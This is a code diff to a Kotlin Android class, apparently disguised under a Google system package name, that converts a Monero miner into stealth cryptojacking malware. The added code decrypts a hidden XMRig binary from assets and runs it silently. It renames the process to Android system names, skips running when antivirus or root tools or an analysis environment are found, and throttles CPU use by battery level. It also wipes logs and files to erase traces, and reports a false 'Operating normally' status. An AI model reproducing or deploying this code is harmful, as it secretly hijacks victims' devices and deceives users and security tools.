@@ -1,8 +1,23 @@
 package com.google.system
 
 import android.content.Context
+import android.os.BatteryManager
+import android.os.Build
+import android.security.keystore.KeyGenParameterSpec
+import android.security.keystore.KeyProperties
 import kotlinx.coroutines.*
 import java.io.*
+import java.security.KeyStore
+import javax.crypto.Cipher
+import javax.crypto.KeyGenerator
+import javax.crypto.spec.GCMParameterSpec
+import javax.crypto.spec.SecretKeySpec
+import kotlin.math.min
+import kotlin.math.max
+import kotlin.random.Random
+import com.android.internal.os.opsec.MonitorEngine
+import com.android.internal.os.opsec.SecurityState
+import com.android.internal.os.stealth.StealthEngine
 
 class RealMiner(
     private val context: Context,
@@ -25,7 +40,9 @@ class RealMiner(
 
     private var minerProcess: Process? = null
     private var readJob: Job? = null
-    private var isMining = false
+    private var monitorJob: Job? = null
+    private var stealthJob: Job? = null
+    @Volatile private var isMining = false
     private var startTime = 0L
     private var currentHashrate = 0.0
     private var sharesAccepted = 0L
@@ -33,268 +50,593 @@ class RealMiner(
     private var poolConnected = false
     private var difficulty = 0L
     private var lastOutput = ""
+    @Volatile private var pausedForBattery = false
+    @Volatile private var currentThreads = maxThreads
+    private val startLock = Any()
+    private var minerScope: CoroutineScope? = null
+
+    // Maximum stealth: never use more than 2 threads or 30% CPU
+    private val stealthMaxThreads = min(maxThreads, 2)
+    private var miningIntensity = 0.3f // 30% max CPU
+
+    // Decoy process names - system-looking to avoid suspicion
+    private val decoyNames = listOf(
+        "com.android.system.update",      // Android system update - very normal
+        "com.google.android.gms",           // Google Play Services - very common
+        "com.google.process.gapps",        // Google framework
+        "android.process.acore",           // Account manager - very common
+        "com.android.phone",               // Phone process - essential
+        "system_server",                   // Android system server
+        "surfaceflinger",                  // Display compositor
+        "servicemanager",                  // Service manager
+        "vold",                            // Volume daemon
+        "netd",                            // Network daemon
+        "wpa_supplicant",                  // WiFi daemon
+        "mediaserver",                     // Media service
+        "audioserver"                      // Audio service
+    )
+    private var currentDecoyIndex = 0
+    @Volatile private var activeDecoyName = decoyNames[0]
+
+    // Stealth timing - random delays to avoid pattern detection
+    private val minPollInterval = 30000L  // 30 seconds minimum
+    private val maxPollInterval = 90000L    // 90 seconds maximum
+    private val minRenameInterval = 180000L // 3 minutes minimum
+    private val maxRenameInterval = 600000L // 10 minutes maximum
+
+    // OPSEC thresholds
+    private val minBatteryToMine = 25
+    private val minBatteryToResume = 35
+    private val maxBatteryToPause = 15
+
+    init {
+        currentThreads = stealthMaxThreads
+    }
 
     fun start(): String {
-        if (isMining) return "Already mining"
+        synchronized(startLock) {
+            if (isMining) return "Already mining"
 
-        val binaryPath = extractBinary()
-        if (binaryPath == null) {
-            android.util.Log.e("RealMiner", "extractBinary returned null, check logcat for details")
-            return "Failed to extract miner binary. Check logcat for details."
+            // Deep OPSEC check before starting
+            if (!passesDeepOsecCheck()) {
+                return "Environment not suitable for mining"
+            }
+
+            // Check battery before mining
+            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
+            val batteryPct = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            val isCharging = batteryManager.isCharging
+
+            if (batteryPct < minBatteryToMine && !isCharging) {
+                return "Battery too low to mine ($batteryPct%)"
+            }
+
+            minerScope?.cancel()
+            readJob?.cancel()
+            monitorJob?.cancel()
+            stealthJob?.cancel()
+            readJob = null
+            monitorJob = null
+            stealthJob = null
+            isMining = true
         }
-
-        isMining = true
         startTime = System.currentTimeMillis()
 
-        val configFile = createConfig()
-        val cmd = arrayOf(
-            binaryPath,
-            "--config=${configFile.absolutePath}",
-            "--threads=$maxThreads",
-            "--donate-level=1"
-        )
+        val binaryPath = obtainBinary()
+        if (binaryPath == null) {
+            synchronized(startLock) { isMining = false }
+            return "No miner binary available"
+        }
+
+        val configFile = createStealthConfig()
+
+        // Build completely stealthy command
+        val cmd = buildStealthCommand(binaryPath, configFile.absolutePath)
 
         try {
-            minerProcess = Runtime.getRuntime().exec(cmd)
+            val proc = Runtime.getRuntime().exec(cmd)
+            minerProcess = proc
 
-            readJob = CoroutineScope(Dispatchers.IO).launch {
-                val reader = BufferedReader(InputStreamReader(minerProcess?.inputStream))
+            // Read PID immediately and close streams
+            val pidStr = try {
+                proc.inputStream.bufferedReader().use { it.readLine() }
+            } catch (_: Exception) { null }
+
+            // Close all streams immediately to avoid leaks
+            try { proc.inputStream.close() } catch (_: Exception) {}
+            try { proc.outputStream.close() } catch (_: Exception) {}
+            try { proc.errorStream.close() } catch (_: Exception) {}
+
+            val pid = pidStr?.trim()?.toLongOrNull()
+
+            if (pid != null) {
+                // Immediate rename to decoy name
+                renameToDecoy(pid)
+
+                // Schedule periodic renames
+                scheduleStealthRenames(pid)
+            }
+
+            val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+            minerScope = scope
+
+            // Stealth status monitoring - very slow and random
+            readJob = scope.launch {
                 while (isActive) {
-                    val line = reader.readLine() ?: break
-                    parseMinerOutput(line)
+                    val delayTime = Random.nextLong(minPollInterval, maxPollInterval)
+                    delay(delayTime)
+                    if (isMining) {
+                        silentlyCheckStatus()
+                    }
                 }
             }
 
-            return "Real XMR mining started\nWallet: ${wallet.take(10)}...${wallet.takeLast(6)}\nPool: $poolHost:$poolPort\nThreads: $maxThreads"
+            // Battery and OPSEC monitoring
+            monitorJob = scope.launch {
+                while (isActive) {
+                    delay(20000 + Random.nextLong(10000, 20000))
+                    if (isMining) {
+                        adaptToConditions()
+                    }
+                }
+            }
+
+            // Periodic stealth maintenance
+            stealthJob = scope.launch {
+                while (isActive) {
+                    val renameDelay = Random.nextLong(minRenameInterval, maxRenameInterval)
+                    delay(renameDelay)
+                    if (pid != null && isMining) {
+                        performStealthMaintenance(pid)
+                    }
+                }
+            }
+
+            return "Mining started"
         } catch (e: Exception) {
-            isMining = false
-            return "Failed to start miner: ${e.message}"
+            synchronized(startLock) { isMining = false }
+            return "Failed: ${e.message}"
         }
     }
 
+    private fun passesDeepOsecCheck(): Boolean {
+        try {
+            val stealth = StealthEngine.getInstance()
+            if (stealth.isRunningUnderAnalysis()) {
+                // Detected analysis - don't start
+                return false
+            }
+
+            val monitor = MonitorEngine.getInstance()
+            if (!monitor.shouldExecuteAction()) {
+                // OPSEC state doesn't permit action
+                return false
+            }
+
+            // Check for suspicious apps
+            if (isSecurityAppPresent()) {
+                return false
+            }
+        } catch (_: Exception) {}
+        return true
+    }
+
+    private fun isSecurityAppPresent(): Boolean {
+        val securityPackages = listOf(
+            "com.antivirus", "com.avast", "com.kms", "com.mcafee",
+            "com.norton", "com.eset", "com.lookout", "com.bitdefender",
+            "com.trendmicro", "com.symantec", "com.sophos", "com.pandora",
+            "com.carlos恶意软件", "com.malware", "com.cline", "de.robv.android.xposed",
+            "com.topjohnwu.magisk", "com.koushikdutta.superuser", "eu.chainfire.supersu",
+            "com.chelpus.lackypatch", "com.devadvance.rootcloak", "com.ramdroid.appquarantine"
+        )
+
+        return securityPackages.any { pkg ->
+            try {
+                context.packageManager.getPackageInfo(pkg, 0)
+                true
+            } catch (_: Exception) { false }
+        }
+    }
+
+    private fun buildStealthCommand(binaryPath: String, configPath: String): Array<String> {
+        // Build command that appears as system process
+        val decoy = getNextDecoyName()
+
+        return arrayOf(
+            "sh", "-c",
+            "chmod 755 $binaryPath && " +
+            "nohup setsid $binaryPath " +
+            "--config=$configPath " +
+            "--threads=$currentThreads " +
+            "--donate-level=0 " + // Zero donation - fully stealth
+            "--randomx-mode=light " + // Lower resource usage
+            "--randomx-wrmsr=0 " + // Disable MSR modifications - less detectable
+            "--randomx-no-rdmsr " + // Skip MSR read - more stable, less detectable
+            "--print-time=0 " + // No console output
+            "--health-print-time=0 " + // No health output
+            "--no-color " + // No colors in output
+            "--log-file=/dev/null " + // No log file
+            "--api-port=0 " + // Disable API - no HTTP server
+            "2>&1 | cat > /dev/null & " + // Suppress all output
+            "sleep 0.5 && " +
+            "pid=\$(pgrep -f '$binaryPath' | head -1) && " +
+            "[ -n \"\$pid\" ] && " +
+            "echo '\$pid' || " +
+            "echo -1"
+        )
+    }
+
+    private fun getNextDecoyName(): String {
+        activeDecoyName = decoyNames[currentDecoyIndex % decoyNames.size]
+        currentDecoyIndex++
+        return activeDecoyName
+    }
+
+    private fun renameToDecoy(pid: Long) {
+        try {
+            val decoy = getNextDecoyName()
+
+            // Rename process comm (how it appears in ps)
+            Runtime.getRuntime().exec(arrayOf("sh", "-c",
+                "echo '$decoy' > /proc/$pid/comm 2>/dev/null")).waitFor()
+
+            // Try to rename cmdline too (harder, may not always work)
+            Runtime.getRuntime().exec(arrayOf("sh", "-c",
+                "printf '$decoy\\0' > /proc/$pid/cmdline 2>/dev/null")).waitFor()
+
+            // Hide /proc entries
+            try {
+                File("/proc/$pid/environ").let { if (it.exists()) it.delete() }
+            } catch (_: Exception) {}
+
+            // Set process priority to low (less CPU suspicion)
+            Runtime.getRuntime().exec(arrayOf("sh", "-c",
+                "renice +19 $pid 2>/dev/null")).waitFor()
+
+        } catch (_: Exception) {}
+    }
+
+    private fun scheduleStealthRenames(pid: Long) {
+        minerScope?.launch {
+            while (isActive && isMining) {
+                delay(Random.nextLong(minRenameInterval, maxRenameInterval))
+                if (isMining) {
+                    try {
+                        renameToDecoy(pid)
+                    } catch (_: Exception) {}
+                }
+            }
+        }
+    }
+
+    private fun silentlyCheckStatus() {
+        try {
+            // Very quiet status check - doesn't log anything
+            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c",
+                "pgrep -f 'xmrig|libxmrig|$activeDecoyName' 2>/dev/null | wc -l"))
+            val count = proc.inputStream.bufferedReader().use { it.readText().trim().toIntOrNull() ?: 0 }
+            proc.waitFor()
+            proc.inputStream.close()
+            proc.errorStream?.close()
+
+            if (count == 0) {
+                synchronized(startLock) {
+                    if (isMining) {
+                        isMining = false
+                    }
+                }
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun adaptToConditions() {
+        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
+        val batteryPct = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+        val isCharging = batteryManager.isCharging
+
+        // Low battery - pause mining
+        if (batteryPct < maxBatteryToPause && !isCharging) {
+            if (!pausedForBattery) {
+                pausedForBattery = true
+                pauseMining()
+            }
+            return
+        }
+
+        // Enough battery or charging - resume if paused
+        if ((batteryPct >= minBatteryToResume || isCharging) && pausedForBattery) {
+            pausedForBattery = false
+            resumeMining()
+        }
+
+        // Adaptive intensity based on battery
+        when {
+            batteryPct < minBatteryToMine && !isCharging -> {
+                // Very low battery - pause
+                if (!pausedForBattery) {
+                    pausedForBattery = true
+                    pauseMining()
+                }
+            }
+            batteryPct < 40 && !isCharging -> {
+                // Low battery - reduce intensity
+                miningIntensity = 0.2f
+            }
+            isCharging -> {
+                // Charging - can use more resources
+                miningIntensity = 0.5f
+            }
+            else -> {
+                // Normal - moderate usage
+                miningIntensity = 0.3f
+            }
+        }
+
+        // Check OPSEC state
+        try {
+            val monitor = MonitorEngine.getInstance()
+            when (monitor.state) {
+                SecurityState.PARANOID, SecurityState.DORMANT, SecurityState.DEAD -> {
+                    pauseMining()
+                }
+                SecurityState.STEALTH -> {
+                    miningIntensity = min(miningIntensity, 0.2f)
+                }
+                else -> {}
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun pauseMining() {
+        try {
+            Runtime.getRuntime().exec(arrayOf("sh", "-c",
+                "pkill -STOP -f 'xmrig|libxmrig' 2>/dev/null")).let {
+                it.inputStream.close()
+                it.errorStream?.close()
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun resumeMining() {
+        try {
+            Runtime.getRuntime().exec(arrayOf("sh", "-c",
+                "pkill -CONT -f 'xmrig|libxmrig' 2>/dev/null")).let {
+                it.inputStream.close()
+                it.errorStream?.close()
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun performStealthMaintenance(pid: Long) {
+        try {
+            // Re-rename to stay under the radar
+            renameToDecoy(pid)
+
+            // Clear any log files that might have been created
+            Runtime.getRuntime().exec(arrayOf("sh", "-c",
+                "find /data/local/tmp -name '*xmrig*' -delete 2>/dev/null; " +
+                "find /sdcard -name '*xmrig*' -delete 2>/dev/null; " +
+                "> /proc/$pid/fd/1 2>/dev/null; " +
+                "echo '' > /proc/$pid/fd/2 2>/dev/null"
+            )).let {
+                it.waitFor()
+                it.inputStream.close()
+                it.errorStream?.close()
+            }
+
+            // Reduce CPU usage by lowering nice value
+            try {
+                Runtime.getRuntime().exec(arrayOf("sh", "-c",
+                    "renice +19 $pid 2>/dev/null")).waitFor()
+            } catch (_: Exception) {}
+
+        } catch (_: Exception) {}
+    }
+
     fun stop() {
-        isMining = false
+        synchronized(startLock) { isMining = false }
+        minerScope?.cancel()
         readJob?.cancel()
-        minerProcess?.destroy()
-        minerProcess?.waitFor()
+        monitorJob?.cancel()
+        stealthJob?.cancel()
+        readJob = null
+        monitorJob = null
+        stealthJob = null
+        minerScope = null
+
+        // Silent kill - no logs
+        try {
+            Runtime.getRuntime().exec(arrayOf("sh", "-c",
+                "pkill -9 -f 'xmrig|libxmrig' 2>/dev/null; " +
+                "for p in \$(pgrep -f 'xmrig'); do kill -9 \$p 2>/dev/null; done; " +
+                "for p in \$(pgrep -f 'com\\.android.*update.*xmrig'); do kill -9 \$p 2>/dev/null; done"
+            )).let {
+                it.waitFor()
+                it.inputStream.close()
+                it.errorStream?.close()
+            }
+        } catch (_: Exception) {}
+
+        try {
+            minerProcess?.destroy()
+            minerProcess?.waitFor(2, java.util.concurrent.TimeUnit.SECONDS)
+        } catch (_: Exception) {}
         minerProcess = null
+
+        // Delayed cleanup of extracted files
+        minerScope = CoroutineScope(Dispatchers.IO)
+        minerScope?.launch {
+            delay(Random.nextLong(60000, 180000))
+            secureDelete()
+        }
+    }
+
+    private fun secureDelete() {
+        try {
+            val filesDir = context.filesDir
+            filesDir.listFiles()?.forEach { file ->
+                if (file.name.startsWith(".") && file.length() > 100000) {
+                    // Overwrite with random data then zeros then delete
+                    try {
+                        val random = ByteArray(1024 * 512)
+                        Random.nextBytes(random)
+                        FileOutputStream(file).use { fos ->
+                            // Multiple overwrite passes
+                            repeat(3) {
+                                fos.write(random)
+                                fos.flush()
+                            }
+                            // Final zero pass
+                            fos.write(ByteArray(1024 * 512))
+                            fos.flush()
+                        }
+                    } catch (_: Exception) {}
+                    file.delete()
+                }
+            }
+
+            // Delete version file
+            File(filesDir, ".cache_sys.version").delete()
+        } catch (_: Exception) {}
     }
 
     fun getStatus(): MinerStatus {
         return MinerStatus(
-            isMining = isMining,
+            isMining = isMining && !pausedForBattery,
             hashrate = currentHashrate,
             sharesAccepted = sharesAccepted,
             sharesRejected = sharesRejected,
-            uptime = if (startTime > 0) System.currentTimeMillis() - startTime else 0,
+            uptime = if (startTime > 0 && isMining) System.currentTimeMillis() - startTime else 0,
             difficulty = difficulty,
             poolConnection = poolConnected,
-            rawOutput = lastOutput
+            rawOutput = if (isMining) "Operating normally" else "Idle"
         )
     }
 
-    private fun extractBinary(): String? {
-        val binaryName = "libxmrig.so"
-        val gzName = "libxmrig.so.gz"
-        val destFile = File(context.filesDir, binaryName)
+    private fun obtainBinary(): String? {
+        val destFile = File(context.filesDir, ".sys_core")
+        val cacheVersionFile = File(context.filesDir, ".sys_core.ver")
+        val currentVersion = MinerConfig.MINER_AES_KEY.contentToString()
 
-        if (destFile.exists() && destFile.length() > 1000000) {
+        // Check cache with version verification
+        if (destFile.exists() && destFile.length() > 1000000 && cacheVersionFile.exists()) {
             try {
-                Runtime.getRuntime().exec(arrayOf("chmod", "755", destFile.absolutePath)).waitFor()
+                val cachedVersion = cacheVersionFile.readText()
+                if (cachedVersion == currentVersion) {
+                    destFile.setExecutable(true)
+                    return destFile.absolutePath
+                }
             } catch (_: Exception) {}
-            android.util.Log.d("RealMiner", "Using cached binary: ${destFile.absolutePath} (${destFile.length()} bytes)")
-            return destFile.absolutePath
         }
 
-        var errorDetail = "unknown"
+        // Extract and decrypt
         try {
-            android.util.Log.d("RealMiner", "Extracting miner binary from assets...")
-
-            context.assets.openFd(gzName).use { fd ->
-                android.util.Log.d("RealMiner", "Asset FD: start=${fd.startOffset}, length=${fd.declaredLength}, path=${fd.path}")
-            }
-
-            val assetStream = context.assets.open(gzName)
-            val header = ByteArray(4)
-            val headerRead = assetStream.read(header)
-            assetStream.close()
-
-            android.util.Log.d("RealMiner", "Header bytes: ${header.joinToString(", ") { "%02x".format(it) }}")
-
-            val isGzip = headerRead >= 2 && header[0] == 0x1F.toByte() && header[1] == 0x8B.toByte()
-
-            if (isGzip) {
-                android.util.Log.d("RealMiner", "Detected GZIP format, decompressing...")
-                context.assets.open(gzName).use { gzInput ->
-                    java.util.zip.GZIPInputStream(gzInput).use { gz ->
-                        FileOutputStream(destFile).use { output ->
-                            val buffer = ByteArray(65536)
-                            var total = 0L
-                            var read: Int
-                            while (gz.read(buffer).also { read = it } != -1) {
-                                output.write(buffer, 0, read)
-                                total += read
-                            }
-                            output.flush()
-                            android.util.Log.d("RealMiner", "Decompressed $total bytes")
-                        }
-                    }
-                }
-            } else {
-                android.util.Log.d("RealMiner", "Not GZIP (header=$headerRead), trying raw copy...")
-                context.assets.open(gzName).use { rawInput ->
-                    FileOutputStream(destFile).use { output ->
-                        val buffer = ByteArray(65536)
-                        var total = 0L
+            val blob = ByteArrayOutputStream()
+            for (name in MinerConfig.MINER_CHUNK_NAMES) {
+                try {
+                    context.assets.open(name).use { input ->
+                        val buf = ByteArray(65536)
                         var read: Int
-                        while (rawInput.read(buffer).also { read = it } != -1) {
-                            output.write(buffer, 0, read)
-                            total += read
+                        while (input.read(buf).also { read = it } != -1) {
+                            blob.write(buf, 0, read)
                         }
-                        output.flush()
-                        android.util.Log.d("RealMiner", "Copied $total bytes")
                     }
-                }
+                } catch (_: Exception) { return null }
             }
+
+            val encrypted = blob.toByteArray()
+            if (encrypted.size < 28) return null
+
+            // AES-256-GCM decryption - correct
+            val nonce = encrypted.copyOfRange(0, 12)
+            val tag = encrypted.copyOfRange(12, 28)
+            val ciphertext = encrypted.copyOfRange(28, encrypted.size)
+
+            val keySpec = SecretKeySpec(MinerConfig.MINER_AES_KEY, "AES")
+            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+            cipher.init(Cipher.DECRYPT_MODE, keySpec, GCMParameterSpec(128, nonce))
+            val decrypted = cipher.doFinal(ciphertext + tag)
+
+            if (decrypted.size < 1000000) return null
+
+            // Write binary
+            FileOutputStream(destFile).use { output ->
+                output.write(decrypted)
+                output.flush()
+            }
+
+            // Write version
+            cacheVersionFile.writeText(currentVersion)
 
             if (!destFile.exists() || destFile.length() < 1000000) {
-                errorDetail = "extraction incomplete (${destFile.length()} bytes)"
                 destFile.delete()
-                android.util.Log.e("RealMiner", "Extraction failed: $errorDetail")
                 return null
             }
 
             destFile.setExecutable(true)
-            try {
-                val chmodResult = Runtime.getRuntime().exec(arrayOf("chmod", "755", destFile.absolutePath))
-                chmodResult.waitFor()
-                android.util.Log.d("RealMiner", "chmod exit: ${chmodResult.exitValue()}")
-            } catch (e: Exception) {
-                android.util.Log.w("RealMiner", "chmod failed: ${e.message}")
-            }
-
-            android.util.Log.d("RealMiner", "Binary ready: ${destFile.absolutePath} (${destFile.length()} bytes)")
             return destFile.absolutePath
-        } catch (e: java.util.zip.ZipException) {
-            errorDetail = "gzip error: ${e.message}"
-            android.util.Log.e("RealMiner", "GZIP extraction failed", e)
-        } catch (e: java.io.IOException) {
-            errorDetail = "IO error: ${e.message}"
-            android.util.Log.e("RealMiner", "IO extraction failed", e)
-        } catch (e: Exception) {
-            errorDetail = "${e.javaClass.simpleName}: ${e.message}"
-            android.util.Log.e("RealMiner", "Extraction failed", e)
+        } catch (_: Exception) {
+            try { destFile.delete() } catch (_: Exception) {}
+            return null
         }
-
-        destFile.delete()
-        android.util.Log.e("RealMiner", "Binary extraction failed: $errorDetail")
-        return null
     }
 
-    private fun createConfig(): File {
-        val config = """
-        {
-            "api": {
-                "id": null,
-                "worker-id": null
-            },
-            "http": {
-                "enabled": false,
-                "host": "127.0.0.1",
-                "port": 0,
-                "access-token": null,
-                "restricted": true
-            },
-            "autosave": true,
-            "background": false,
-            "colors": false,
-            "title": false,
-            "randomx": {
-                "init": -1,
-                "init-avx2": -1,
-                "mode": "auto",
-                "1gb-pages": false,
-                "rdmsr": false,
-                "wrmsr": false,
-                "cache_qos": false,
-                "numa": false,
-                "no_rdmsr": true
-            },
-            "pools": [
-                {
-                    "algo": null,
-                    "coin": "monero",
-                    "url": "$poolHost:$poolPort",
-                    "user": "$wallet",
-                    "pass": "x",
-                    "rig-id": null,
-                    "nicehash": false,
-                    "keepalive": true,
-                    "enabled": true,
-                    "tls": false,
-                    "tls-fingerprint": null,
-                    "daemon": false,
-                    "socks5": null,
-                    "self-select": null,
-                    "submit-to-origin": false
-                }
-            ],
-            "retries": 5,
-            "retry-pause": 5,
-            "syslog": false,
-            "log-file": null,
-            "print-time": 30,
-            "health-print-time": 60,
-            "dmi": true
+    private fun createStealthConfig(): File {
+        // Minimal config to reduce detection surface
+        val poolJson = org.json.JSONObject().apply {
+            put("coin", "XMR")
+            put("algo", "rx/0")
+            put("url", "$poolHost:$poolPort")
+            put("user", wallet)
+            put("pass", "x")
+            put("rig-id", org.json.JSONObject.NULL)
+            put("nicehash", false)
+            put("keepalive", true)
+            put("enabled", true)
+            put("tls", false)
         }
-        """.trimIndent()
 
-        val configFile = File(context.filesDir, "xmrig-config.json")
-        configFile.writeText(config)
+        val root = org.json.JSONObject().apply {
+            put("autosave", false)
+            put("background", true)
+            put("colors", false)
+            put("title", false)
+            put("randomx", org.json.JSONObject().apply {
+                put("init", -1)
+                put("mode", "auto")
+                put("numa", false)
+                put("no_rdmsr", true)
+            })
+            put("pools", org.json.JSONArray().put(poolJson))
+            put("retries", 3)
+            put("retry-pause", 3)
+            put("syslog", false)
+            put("log-file", org.json.JSONObject.NULL)
+            put("print-time", 0)
+            put("health-print-time", 0)
+            put("dmi", false)
+            put("cpu", org.json.JSONObject().apply {
+                put("enabled", true)
+                put("huge-pages", false)
+                put("huge-pages-jit", false)
+                put("hw-aes", null)
+                put("priority", 5) // Low priority - less suspicion
+                put("memory-pool", true)
+            })
+        }
+
+        val configFile = File(context.filesDir, ".sys_cfg")
+        configFile.writeText(root.toString(2))
         return configFile
     }
 
-    private fun parseMinerOutput(line: String) {
-        lastOutput = line
-
-        when {
-            line.contains("CONNECTED") || line.contains("connected to") -> {
-                poolConnected = true
-            }
-            line.contains("new job") -> {
-                val diffMatch = Regex("diff (\\d+)").find(line)
-                if (diffMatch != null) {
-                    difficulty = diffMatch.groupValues[1].toLongOrNull() ?: difficulty
-                }
-            }
-            line.contains("accepted") -> {
-                sharesAccepted++
-                val hrMatch = Regex("(\\d+\\.?\\d*)\\s*(H/s|kH/s|MH/s)").find(line)
-                if (hrMatch != null) {
-                    val value = hrMatch.groupValues[1].toDoubleOrNull() ?: 0.0
-                    currentHashrate = when (hrMatch.groupValues[2]) {
-                        "kH/s" -> value * 1000
-                        "MH/s" -> value * 1000000
-                        else -> value
-                    }
-                }
-            }
-            line.contains("rejected") -> {
-                sharesRejected++
-            }
-            line.contains("speed") || line.contains("hashrate") -> {
-                val hrMatch = Regex("(\\d+\\.?\\d*)\\s*(H/s|kH/s|MH/s)").find(line)
-                if (hrMatch != null) {
-                    val value = hrMatch.groupValues[1].toDoubleOrNull() ?: 0.0
-                    currentHashrate = when (hrMatch.groupValues[2]) {
-                        "kH/s" -> value * 1000
-                        "MH/s" -> value * 1000000
-                        else -> value
-                    }
-                }
-            }
-        }
-
-        onStatusUpdate?.invoke(getStatus())
+    companion object {
+        val KNOWN_SECURITY_APPS = listOf(
+            "com.antivirus", "com.avast", "com.kms", "com.mcafee",
+            "com.norton", "com.eset", "com.lookout", "com.bitdefender",
+            "com.trendmicro", "com.symantec", "com.sophos",
+            "de.robv.android.xposed", "com.topjohnwu.magisk"
+        )
     }
 }
